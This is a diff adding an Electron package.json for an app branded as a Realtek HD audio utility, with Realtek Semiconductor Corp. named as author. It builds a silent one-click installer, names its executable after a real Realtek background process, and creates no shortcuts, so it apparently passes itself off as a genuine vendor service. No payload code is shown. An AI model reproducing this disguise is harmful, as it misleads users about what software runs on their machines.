@@ -1,0 +1,34 @@
+{
+  "name": "realtek-audio-utility",
+  "version": "1.0.0",
+  "description": "Realtek High Definition Audio Service",
+  "author": "Realtek Semiconductor Corp.",
+  "main": "main.js",
+  "scripts": {
+    "start": "electron .",
+    "build": "electron-builder"
+  },
+  "build": {
+    "appId": "com.realtek.audio.service",
+    "productName": "Realtek HD Audio Background Process",
+    "win": {
+      "target": "nsis",
+      "executableName": "RAVBg64",
+      "requestedExecutionLevel": "asInvoker"
+    },
+    "nsis": {
+      "oneClick": true,
+      "perMachine": true,
+      "allowToChangeInstallationDirectory": false,
+      "createDesktopShortcut": false,
+      "createStartMenuShortcut": false,
+      "installerIcon": "icon.ico",
+      "uninstallerIcon": "icon.ico",
+      "artifactName": "Realtek_HD_Audio_Setup.exe"
+    }
+  },
+  "devDependencies": {
+    "electron": "^33.0.0",
+    "electron-builder": "^24.13.3"
+  }
+}
